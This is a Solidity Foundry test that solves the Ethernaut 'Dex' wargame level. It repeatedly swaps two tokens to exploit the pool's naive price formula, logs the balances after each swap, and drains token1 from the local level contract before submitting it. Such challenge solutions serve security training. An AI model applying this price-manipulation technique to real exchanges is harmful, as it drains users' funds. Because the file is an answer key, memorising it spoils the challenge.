// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "forge-std/Vm.sol";

import "src/core/Ethernaut.sol";
import "src/levels/22-Dex/DexFactory.sol";

contract DexTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;
    address hacker = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
    }

    function testDexHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        DexFactory dexFactory = new DexFactory();
        ethernaut.registerLevel(dexFactory);
        vm.startPrank(hacker);
        address levelAddress = ethernaut.createLevelInstance(dexFactory);
        Dex ethernautDex = Dex(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        address token1 = ethernautDex.token1();
        address token2 = ethernautDex.token2();

        ethernautDex.approve(levelAddress, type(uint256).max);
        for(uint256 i; i < 5; ++i) {
            if (i % 2 == 0) {
                ethernautDex.swap(token1, token2, ethernautDex.balanceOf(token1, hacker));
            } else {
                ethernautDex.swap(token2, token1, ethernautDex.balanceOf(token2, hacker));
            }
        
            emit log("---------------- swap ----------------");
            emit log_named_uint("The hacker's balance of token1", ethernautDex.balanceOf(token1, hacker));
            emit log_named_uint("The hacker's balance of token2", ethernautDex.balanceOf(token2, hacker));
            emit log_named_uint("The balance of token1 in the DEX", ethernautDex.balanceOf(token1, levelAddress));
            emit log_named_uint("The balance of token2 in the DEX", ethernautDex.balanceOf(token2, levelAddress));
        }

        // how many token2 do we need to swap all token1 in the dex?
        // according to the formula of `getSwapPrice()`: amount * 110 / 45 = 110, where amount is 45
        ethernautDex.swap(token2, token1, 45);
        emit log("---------------- swap ----------------");
        emit log_named_uint("The hacker's balance of token1", ethernautDex.balanceOf(token1, hacker));
        emit log_named_uint("The hacker's balance of token2", ethernautDex.balanceOf(token2, hacker));
        emit log_named_uint("The balance of token1 in the DEX", ethernautDex.balanceOf(token1, levelAddress));
        emit log_named_uint("The balance of token2 in the DEX", ethernautDex.balanceOf(token2, levelAddress));

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}